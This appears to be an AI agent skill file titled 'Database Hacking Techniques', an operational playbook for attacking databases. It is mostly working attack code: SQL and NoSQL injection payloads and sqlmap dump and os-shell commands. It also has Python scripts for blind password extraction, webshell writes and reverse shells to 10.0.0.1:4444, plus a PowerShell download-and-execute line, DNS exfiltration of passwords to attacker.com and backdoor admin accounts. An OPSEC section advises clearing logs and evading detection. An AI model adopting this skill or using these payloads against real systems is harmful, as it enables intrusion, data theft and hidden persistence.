---
name: database-hacking-techniques
description: Exploit and extract data from databases (SQL injection, NoSQL injection, data exfiltration)
version: 1.0.0
author: harezadmm
tags: [database, sql-injection, nosql, mongodb, postgresql, mysql, data-breach]
---

# Database Hacking Techniques

## When to Use
Exploiting database vulnerabilities to extract, modify, or delete data. SQL injection, NoSQL injection, database enumeration, privilege escalation within databases.

## Prerequisites
- Web application or database access
- Understanding of SQL and database structure
- Knowledge of various database types (MySQL, PostgreSQL, MSSQL, MongoDB, Redis)
- Tools: sqlmap, NoSQLMap, SQLiPy

## Attack Vectors

### 1. SQL Injection
Inject malicious SQL to bypass authentication, extract data.

### 2. NoSQL Injection
Exploit NoSQL databases (MongoDB, CouchDB, Redis).

### 3. ORM Injection
Exploit Object-Relational Mapping frameworks.

### 4. Blind SQL Injection
Extract data without direct output (boolean, time-based).

### 5. Out-of-Band SQL Injection
Extract data via DNS or HTTP requests.

### 6. Database Privilege Escalation
Gain DBA privileges from low-privilege user.

## Procedure

### Step 1: SQL Injection Discovery

**Manual testing:**
```bash
# Basic injection test
' OR '1'='1
" OR "1"="1
' OR 1=1--
" OR 1=1--
') OR ('1'='1
") OR ("1"="1

# Check for errors
'
"
`
')
")
`)

# Time-based detection
' OR SLEEP(5)--
' OR pg_sleep(5)--
'; WAITFOR DELAY '00:00:05'--

# Boolean-based detection
' AND 1=1--  (page loads normally)
' AND 1=2--  (page changes or errors)
```

**URL injection points:**
```bash
# GET parameter
https://target.com/product?id=1'

# POST data
username=admin'&password=test

# Headers
User-Agent: ' OR 1=1--
Cookie: session=abc' OR '1'='1
Referer: http://evil.com' OR 1=1--

# JSON
{"username": "admin' OR 1=1--", "password": "test"}

# XML
<user><name>admin' OR 1=1--</name></user>
```

### Step 2: SQLMap (Automated SQL Injection)

**Basic usage:**
```bash
# Test URL parameter
sqlmap -u "https://target.com/product?id=1"

# Test with POST data
sqlmap -u "https://target.com/login" --data="username=admin&password=test"

# Test from Burp Suite request
sqlmap -r request.txt

# Test specific parameter
sqlmap -u "https://target.com/search?q=test&category=all" -p category

# Test with cookies
sqlmap -u "https://target.com/profile" --cookie="PHPSESSID=abc123"

# Test with custom header
sqlmap -u "https://target.com/api" --headers="X-API-Key: test*"
```

**Advanced SQLMap:**
```bash
# Enumerate databases
sqlmap -u "https://target.com/product?id=1" --dbs

# Enumerate tables in specific database
sqlmap -u "https://target.com/product?id=1" -D database_name --tables

# Dump specific table
sqlmap -u "https://target.com/product?id=1" -D database_name -T users --dump

# Dump all databases
sqlmap -u "https://target.com/product?id=1" --dump-all

# Get database banner
sqlmap -u "https://target.com/product?id=1" --banner

# Current user
sqlmap -u "https://target.com/product?id=1" --current-user

# Current database
sqlmap -u "https://target.com/product?id=1" --current-db

# Check if user is DBA
sqlmap -u "https://target.com/product?id=1" --is-dba

# List database users
sqlmap -u "https://target.com/product?id=1" --users

# Dump password hashes
sqlmap -u "https://target.com/product?id=1" --passwords

# OS shell (if DBA)
sqlmap -u "https://target.com/product?id=1" --os-shell

# SQL shell
sqlmap -u "https://target.com/product?id=1" --sql-shell

# File read
sqlmap -u "https://target.com/product?id=1" --file-read="/etc/passwd"

# File write (upload shell)
sqlmap -u "https://target.com/product?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

**SQLMap evasion techniques:**
```bash
# Random User-Agent
sqlmap -u "https://target.com/product?id=1" --random-agent

# Tamper scripts (WAF bypass)
sqlmap -u "https://target.com/product?id=1" --tamper=space2comment

# Multiple tampers
sqlmap -u "https://target.com/product?id=1" --tamper=space2comment,between,randomcase

# Delay between requests
sqlmap -u "https://target.com/product?id=1" --delay=2

# Custom injection markers
sqlmap -u "https://target.com/product?id=1*" --prefix="') OR " --suffix="-- -"

# Tor proxy
sqlmap -u "https://target.com/product?id=1" --tor --tor-type=SOCKS5

# Level and risk (aggressive testing)
sqlmap -u "https://target.com/product?id=1" --level=5 --risk=3
```

### Step 3: Manual SQL Injection Exploitation

**MySQL injection:**
```sql
-- Union-based injection (extract data)
' UNION SELECT 1,2,3,4,5--
' UNION SELECT NULL,username,password,NULL,NULL FROM users--

-- Determine number of columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--  (error indicates 2 columns)

-- Extract database version
' UNION SELECT NULL,@@version--

-- Extract database name
' UNION SELECT NULL,database()--

-- Extract table names
' UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema=database()--

-- Extract column names
' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--

-- Extract data
' UNION SELECT NULL,CONCAT(username,':',password) FROM users--

-- Read file
' UNION SELECT NULL,LOAD_FILE('/etc/passwd')--

-- Write file (webshell)
' UNION SELECT NULL,'<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--

-- Execute command (MySQL UDF)
' UNION SELECT NULL,sys_exec('whoami')--
```

**PostgreSQL injection:**
```sql
-- Version
' UNION SELECT NULL,version()--

-- Current user
' UNION SELECT NULL,current_user--

-- List tables
' UNION SELECT NULL,tablename FROM pg_tables WHERE schemaname='public'--

-- List columns
' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--

-- Read file
' UNION SELECT NULL,pg_read_file('/etc/passwd',0,100000)--

-- Command execution (requires superuser)
'; CREATE TABLE cmd_output(output text);--
'; COPY cmd_output FROM PROGRAM 'whoami';--
' UNION SELECT NULL,output FROM cmd_output--

-- Or with COPY TO PROGRAM
'; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"'--
```

**MSSQL injection:**
```sql
-- Version
' UNION SELECT NULL,@@version--

-- Current database
' UNION SELECT NULL,DB_NAME()--

-- Current user
' UNION SELECT NULL,SYSTEM_USER--

-- List databases
' UNION SELECT NULL,name FROM master..sysdatabases--

-- List tables
' UNION SELECT NULL,name FROM sysobjects WHERE xtype='U'--

-- List columns
' UNION SELECT NULL,name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--

-- Enable xp_cmdshell (command execution)
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--

-- Execute command
'; EXEC xp_cmdshell 'whoami';--

-- Read file
' UNION SELECT NULL,BulkColumn FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS x--

-- Out-of-band data exfiltration (DNS)
'; DECLARE @data varchar(1024); SELECT @data=(SELECT TOP 1 password FROM users); EXEC('master..xp_dirtree "\\' + @data + '.attacker.com\a"');--
```

**Blind SQL injection (Boolean-based):**
```sql
-- MySQL boolean blind
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='b'--
-- Continue until character matches

-- Extract length
' AND (SELECT LENGTH(password) FROM users LIMIT 1)>5--

-- Automated boolean blind extraction
import requests
import string

url = "https://target.com/product?id=1"
password = ""

for position in range(1, 50):
    for char in string.printable:
        payload = f"' AND (SELECT SUBSTRING(password,{position},1) FROM users LIMIT 1)='{char}'--"
        response = requests.get(url + payload)
        
        if "Product found" in response.text:
            password += char
            print(f"[+] Password so far: {password}")
            break
    else:
        break

print(f"[+] Final password: {password}")
```

**Blind SQL injection (Time-based):**
```python
import requests
import time

url = "https://target.com/search?q="

def check_char(position, char):
    # MySQL
    payload = f"' AND IF((SELECT SUBSTRING(password,{position},1) FROM users LIMIT 1)='{char}',SLEEP(5),0)--"
    
    # PostgreSQL
    # payload = f"' AND (SELECT CASE WHEN (SUBSTRING(password,{position},1)='{char}') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users LIMIT 1) IS NOT NULL--"
    
    # MSSQL
    # payload = f"'; IF (SELECT SUBSTRING(password,{position},1) FROM users)='{char}' WAITFOR DELAY '00:00:05'--"
    
    start = time.time()
    requests.get(url + payload, timeout=10)
    elapsed = time.time() - start
    
    return elapsed > 5

password = ""
for position in range(1, 50):
    for char in "abcdefghijklmnopqrstuvwxyz0123456789":
        if check_char(position, char):
            password += char
            print(f"[+] Password: {password}")
            break
    else:
        break

print(f"[+] Final password: {password}")
```

### Step 4: NoSQL Injection

**MongoDB injection:**
```javascript
// Authentication bypass
username[$ne]=admin&password[$ne]=pass

// JSON payload
{"username": {"$ne": null}, "password": {"$ne": null}}

// Extract data with $regex
{"username": {"$regex": "^admin"}, "password": {"$ne": null}}

// Brute force password character by character
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^b"}}
// Continue until match

// JavaScript injection (if eval() used)
'; return true; var dummy='
'; while(1); var dummy='

// $where injection
{"$where": "this.username == 'admin' && this.password == 'anything' || '1'=='1'"}

// Sleep-based blind injection
{"username": "admin", "password": {"$regex": "^a.*", "$options": "i"}, "$where": "sleep(5000) || true"}
```

**NoSQL injection automation:**
```python
import requests
import string

url = "https://target.com/login"
password = ""

# Character-by-character extraction
for position in range(1, 50):
    for char in string.printable:
        # Test if character at position matches
        payload = {
            "username": "admin",
            "password": {
                "$regex": f"^{password}{char}.*"
            }
        }
        
        response = requests.post(url, json=payload)
        
        if "Welcome" in response.text:
            password += char
            print(f"[+] Password: {password}")
            break
    else:
        break

print(f"[+] Final password: {password}")
```

**CouchDB injection:**
```bash
# Authentication bypass
curl -X POST http://target.com:5984/_session \
  -H "Content-Type: application/json" \
  -d '{"name": {"$ne": null}, "password": {"$ne": null}}'

# List databases
curl http://admin:pass@target.com:5984/_all_dbs

# Dump database
curl http://admin:pass@target.com:5984/database/_all_docs?include_docs=true
```

**Redis injection (if exposed):**
```bash
# Connect to Redis
redis-cli -h target.com

# List keys
KEYS *

# Get all data
redis-cli -h target.com --scan --pattern '*' | while read key; do
    echo "Key: $key"
    redis-cli -h target.com GET "$key"
done

# Write webshell (if Redis can write to web directory)
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET cmd '<?php system($_GET["cmd"]); ?>'
SAVE

# Access shell
curl http://target.com/shell.php?cmd=whoami
```

### Step 5: Second-Order SQL Injection

**Concept:** Inject payload that gets stored, then executed later.

```sql
-- Registration page: store malicious username
username: admin' OR 1=1--
password: test123

-- Later, when profile loads, query becomes:
SELECT * FROM users WHERE username = 'admin' OR 1=1--'

-- Exploit:
1. Register with payload as username
2. Login normally
3. Navigate to page that displays username in query
4. Payload executes with your context
```

**Time-delayed payload:**
```sql
-- Register event with callback URL containing SQLi
event_name: Normal Event
callback_url: https://attacker.com/log?data='; DROP TABLE logs;--

-- When cron job processes callbacks, SQLi executes
```

### Step 6: Database Post-Exploitation

**MySQL privilege escalation:**
```sql
-- Check current privileges
SELECT * FROM mysql.user WHERE user=current_user();

-- Create new admin user
CREATE USER 'backdoor'@'%' IDENTIFIED BY 'Password123!';
GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;

-- UDF (User-Defined Function) for command execution
-- Upload lib_mysqludf_sys.so to plugin directory
SELECT @@plugin_dir;

-- Create UDF
CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';

-- Execute commands
SELECT sys_exec('bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"');
```

**PostgreSQL privilege escalation:**
```sql
-- Check if superuser
SELECT current_setting('is_superuser');

-- Create superuser
CREATE USER backdoor WITH SUPERUSER PASSWORD 'Password123!';

-- Execute commands via COPY
CREATE TABLE cmd_exec(output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;

-- Reverse shell
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"';
```

**MSSQL privilege escalation:**
```sql
-- Check if sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Add user to sysadmin role
EXEC sp_addsrvrolemember 'backdoor', 'sysadmin';

-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute commands
EXEC xp_cmdshell 'powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString(''http://10.0.0.1/shell.ps1'')"';

-- Create database backdoor
CREATE LOGIN backdoor WITH PASSWORD = 'Password123!';
ALTER SERVER ROLE sysadmin ADD MEMBER backdoor;
```

### Step 7: Data Exfiltration Techniques

**Large data dumps:**
```bash
# SQLMap with multithreading
sqlmap -u "https://target.com/product?id=1" -D database_name --dump --threads=10

# MySQL dump via command line
mysqldump -h target.com -u username -p database_name > dump.sql

# PostgreSQL dump
pg_dump -h target.com -U username database_name > dump.sql

# MSSQL dump (Windows)
sqlcmd -S target.com -U username -P password -Q "SELECT * FROM database.dbo.users" -o dump.txt
```

**Chunked exfiltration (avoid detection):**
```python
import requests
import time

url = "https://target.com/api"

# Extract 100 rows at a time
offset = 0
limit = 100
all_data = []

while True:
    payload = f"' UNION SELECT NULL,CONCAT(id,':',username,':',email) FROM users LIMIT {limit} OFFSET {offset}--"
    
    response = requests.get(url, params={"id": payload})
    data = parse_response(response.text)
    
    if not data:
        break
    
    all_data.extend(data)
    offset += limit
    
    # Delay to avoid rate limiting
    time.sleep(5)

# Save to file
with open('exfiltrated_data.txt', 'w') as f:
    f.write('\n'.join(all_data))
```

**Out-of-band exfiltration (DNS):**
```sql
-- MySQL (requires LOAD_FILE privilege)
' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\a'))--

-- MSSQL (xp_dirtree)
'; DECLARE @data varchar(100); SELECT @data=(SELECT TOP 1 password FROM users); EXEC('master..xp_dirtree "\\' + @data + '.attacker.com\a"');--

-- PostgreSQL (requires network access)
' UNION SELECT NULL FROM dblink('host=attacker.com user=x password='||(SELECT password FROM users LIMIT 1)||' dbname=x', 'SELECT 1') AS t(c1 int)--
```

**Setup DNS listener on attacker machine:**
```python
#!/usr/bin/env python3
from scapy.all import *

def dns_callback(pkt):
    if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
        query = pkt[DNSQR].qname.decode()
        if 'attacker.com' in query:
            data = query.split('.')[0]
            print(f"[+] Exfiltrated data: {data}")
            
            with open('exfil.log', 'a') as f:
                f.write(f"{data}\n")

sniff(filter="udp port 53", prn=dns_callback)
```

### Step 8: ORM Injection

**Hibernate (Java) HQL injection:**
```java
// Vulnerable code
String query = "FROM User WHERE username = '" + input + "'";
session.createQuery(query).list();

// Injection
input = "admin' OR '1'='1

// Exploit
admin' OR '1'='1' OR username='admin
```

**Django ORM injection:**
```python
# Vulnerable code
User.objects.extra(where=["username = '%s'" % username])

# Injection
username = "' OR '1'='1"

# Exploit with raw SQL
User.objects.raw("SELECT * FROM users WHERE username = '%s'" % username)
```

**Entity Framework (C#) injection:**
```csharp
// Vulnerable code
context.Users.SqlQuery("SELECT * FROM Users WHERE Username = '" + input + "'").ToList();

// Injection
input = "' OR 1=1--"
```

## Pitfalls

**WAF detection**: Web Application Firewalls block common SQLi patterns.

**Parameterized queries**: Modern apps use prepared statements (no injection possible).

**Rate limiting**: Slow down automated extraction to avoid detection.

**Connection limits**: Database may limit concurrent connections.

**Privilege restrictions**: Low-privilege DB user can't read all tables.

## Verification

```bash
# Verify SQL injection
sqlmap -u "https://target.com/product?id=1" --batch --dbms=MySQL

# Test manually
curl "https://target.com/product?id=1' OR 1=1--" | grep "SQL syntax"

# Verify data extraction
sqlmap -u "https://target.com/product?id=1" -D database_name -T users --dump | grep admin

# Check OS command execution
sqlmap -u "https://target.com/product?id=1" --os-shell
# Then: whoami
```

## OPSEC

- Use Tor/VPN when attacking live targets
- Rate limit requests to avoid IDS detection
- Clear database logs after exploitation
- Don't dump entire databases at once
- Exfiltrate data in chunks over time
- Use encrypted channels for data exfiltration
- Clean up created database users/tables

## References

- OWASP SQL Injection Guide
- SQLMap documentation
- NoSQL injection cheat sheet (PayloadsAllTheThings)
- Database hacking (HackTricks)
- PortSwigger SQL injection labs
